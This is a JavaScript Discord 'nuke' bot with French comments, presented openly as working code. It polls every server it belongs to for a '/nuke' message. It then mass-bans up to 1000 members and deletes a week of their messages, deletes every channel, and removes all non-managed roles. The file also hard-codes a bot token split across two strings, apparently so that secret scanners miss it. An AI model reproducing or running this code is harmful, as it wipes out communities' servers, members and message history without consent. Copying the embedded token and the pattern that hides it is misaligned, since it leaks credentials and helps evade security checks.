const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;

// On écoute les messages
async function listen() {
  console.log("Bot en ligne, en attente de commande...");
  let lastMsgId = null;

  setInterval(async () => {
    try {
      // on check les messages récents dans tous les salons où le bot est
      let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
        headers: { "Authorization": `Bot ${botToken}` }
      });
      let guilds = await res.json();
      
      for (let g of guilds) {
        let chans = await (await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {
          headers: { "Authorization": `Bot ${botToken}` }
        })).json();
        
        for (let c of chans) {
          if (c.type !== 0) continue; // seulement les salons textuels
          
          let msgs = await (await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {
            headers: { "Authorization": `Bot ${botToken}` }
          })).json();
          
          if (Array.isArray(msgs)) {
            for (let m of msgs) {
              if (m.content === "/nuke" && m.id !== lastMsgId) {
                lastMsgId = m.id;
                console.log("commande /nuke détectée sur le serveur :", g.id);
                nuke(g.id);
              }
            }
          }
        }
      }
    } catch (e) {}
  }, 5000); // vérifie toutes les 5 secondes
}

async function nuke(guild) {
  console.log(`lancement du nuke sur : ${guild}`);
  
  // 1. ban
  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (!members.message) {
    let bans = members.map(m => {
      if (m.user.bot) return Promise.resolve();
      return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
        method: "PUT",
        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
        body: JSON.stringify({ delete_message_seconds: 604800 })
      }).catch(() => {});
    });
    await Promise.all(bans);
  }

  // 2. salons
  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (!channels.message) {
    for (let c of channels) {
      await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
        method: "DELETE",
        headers: { "Authorization": `Bot ${botToken}` }
      }).catch(() => {});
      await new Promise(r => setTimeout(r, 100));
    }
  }

  // 3. rôles
  let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (!roles.message) {
    for (let r of roles) {
      if (r.name === "@everyone" || r.managed) continue;
      await fetch(`https://discord.com/api/v9/guilds/${guild}/roles/${r.id}`, {
        method: "DELETE",
        headers: { "Authorization": `Bot ${botToken}` }
      }).catch(() => {});
      await new Promise(r => setTimeout(r, 100));
    }
  }
  
  console.log("nuke terminé.");
}

listen();